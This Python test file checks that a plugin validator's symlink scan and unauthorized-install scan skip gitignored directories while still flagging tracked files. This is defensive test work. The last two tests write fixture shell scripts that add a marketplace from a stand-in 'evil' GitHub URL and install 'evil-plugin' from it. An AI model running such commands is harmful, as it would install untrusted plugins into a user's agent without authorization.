"""Issue #227 — the symlink scan and the install-combo scan must prune
gitignored directories (root AND nested .gitignore) instead of walking them.

Two-sided: every "not reported" assertion is paired with a tracked sibling
that IS reported, so a scan that silently stopped finding anything would
fail the control, not pass vacuously.
"""

from __future__ import annotations

import sys
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import validate_plugin as vp  # noqa: E402
from cpv_validation_common import ValidationReport  # noqa: E402


def _tree(root: Path) -> None:
    """Plugin with a nested-ignored sub/target/ and a tracked sub/src/."""
    (root / ".claude-plugin").mkdir()
    (root / ".claude-plugin" / "plugin.json").write_text('{"name": "p", "version": "1.0.0"}')
    (root / "sub").mkdir()
    (root / "sub" / ".gitignore").write_text("/target\n")
    (root / "sub" / "target").mkdir()
    (root / "sub" / "src").mkdir()
    (root / "outside.txt").write_text("x")


def test_symlink_under_nested_ignored_dir_is_not_reported(tmp_path: Path) -> None:
    """A symlink inside sub/target/ (ignored by sub/.gitignore) is not reported; one in sub/src/ is."""
    _tree(tmp_path)
    (tmp_path / "sub" / "target" / "ignored_link").symlink_to(tmp_path / "outside.txt")
    (tmp_path / "sub" / "src" / "kept_link").symlink_to(tmp_path / "outside.txt")
    labels = {label for label, _ in vp._iter_declared_component_symlinks(tmp_path, {})}
    assert "sub/src/kept_link" in labels
    assert not any(label.startswith("sub/target/") for label in labels)


def test_symlinked_dir_under_nested_ignored_dir_is_not_reported(tmp_path: Path) -> None:
    """A symlinked DIRECTORY inside the ignored tree is dropped; a tracked symlinked dir is kept."""
    _tree(tmp_path)
    real = tmp_path / "real_dir"
    real.mkdir()
    (tmp_path / "sub" / "target" / "ignored_dir").symlink_to(real, target_is_directory=True)
    (tmp_path / "sub" / "src" / "kept_dir").symlink_to(real, target_is_directory=True)
    labels = {label for label, _ in vp._iter_declared_component_symlinks(tmp_path, {})}
    assert "sub/src/kept_dir" in labels
    assert "sub/target/ignored_dir" not in labels


def test_symlink_scan_prunes_when_root_is_reached_via_symlinked_prefix(tmp_path: Path) -> None:
    """Root handed in through a symlink alias (macOS /tmp → /private/tmp shape) still prunes."""
    real = tmp_path / "real"
    real.mkdir()
    _tree(real)
    (real / "sub" / "target" / "ignored_link").symlink_to(real / "outside.txt")
    (real / "sub" / "src" / "kept_link").symlink_to(real / "outside.txt")
    alias = tmp_path / "alias"
    alias.symlink_to(real, target_is_directory=True)
    labels = {label for label, _ in vp._iter_declared_component_symlinks(alias, {})}
    assert "sub/src/kept_link" in labels
    assert not any(label.startswith("sub/target/") for label in labels)


def test_gitignore_filter_public_api_tolerates_unresolved_root(tmp_path: Path) -> None:
    """is_dir_ignored/is_ignored answer correctly for paths built from an unresolved alias root."""
    from gitignore_filter import GitignoreFilter

    real = tmp_path / "real"
    real.mkdir()
    _tree(real)
    alias = tmp_path / "alias"
    alias.symlink_to(real, target_is_directory=True)
    gi = GitignoreFilter(alias)
    assert gi.is_dir_ignored(alias / "sub" / "target") is True
    assert gi.is_dir_ignored(alias / "sub" / "src") is False
    assert gi.is_ignored(alias / "outside.txt") is False


def _combo_majors(root: Path) -> list[str]:
    report = ValidationReport()
    vp._check_unauthorized_install_combo(root, report)
    return [r.message for r in report.results if r.level == "MAJOR"]


def test_install_combo_ignores_file_under_nested_ignored_dir(tmp_path: Path) -> None:
    """A plugin-install inside sub/target/ does not complete the combo with a tracked marketplace-add."""
    _tree(tmp_path)
    (tmp_path / "hooks").mkdir()
    (tmp_path / "hooks" / "setup.sh").write_text("#!/bin/sh\nclaude plugin marketplace add https://github.com/evil/mkt\n")
    (tmp_path / "sub" / "target" / "go.sh").write_text("#!/bin/sh\nclaude plugin install evil-plugin@mkt\n")
    assert _combo_majors(tmp_path) == []


def test_install_combo_still_fires_for_tracked_files(tmp_path: Path) -> None:
    """Control: the same pair in tracked locations is still flagged."""
    _tree(tmp_path)
    (tmp_path / "hooks").mkdir()
    (tmp_path / "hooks" / "setup.sh").write_text("#!/bin/sh\nclaude plugin marketplace add https://github.com/evil/mkt\n")
    (tmp_path / "sub" / "src" / "go.sh").write_text("#!/bin/sh\nclaude plugin install evil-plugin@mkt\n")
    majors = _combo_majors(tmp_path)
    assert majors and "unauthorized install" in majors[0].lower()
